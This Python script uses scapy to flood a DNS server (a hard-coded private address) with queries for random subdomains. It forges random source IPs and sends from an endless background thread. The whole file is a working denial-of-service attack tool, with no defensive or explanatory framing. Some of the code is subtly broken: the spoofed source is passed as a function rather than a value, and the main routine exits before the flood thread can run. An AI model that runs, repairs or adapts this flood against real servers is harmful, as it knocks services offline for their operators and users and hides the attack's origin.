from scapy.layers import inet, dns
from scapy.sendrecv import send
import threading
import random
import time
from utils import random_ip, random_string

DNS_SERVER_IP = "10.10.10.21"

def dns_flood_work(target_host):
    while True:
        fake_domain_name = random_string() + ".scp.com"
        packet = inet.IP(dst=target_host, src=random_ip) / inet.UDP(dport=53) / dns.DNS(rd=1, qd=dns.DNSQR(qname=fake_domain_name, qtype="A"))
        send(packet, verbose=False)
        time.sleep(random.randrange(5)/1000)

def dns_flood(target_host):
    t = threading.Thread(target=dns_flood_work, args=(target_host,), daemon=True)
    t.start()
    return t

def main():
    dns_thread = dns_flood(DNS_SERVER_IP)

if __name__ == "__main__":
    main()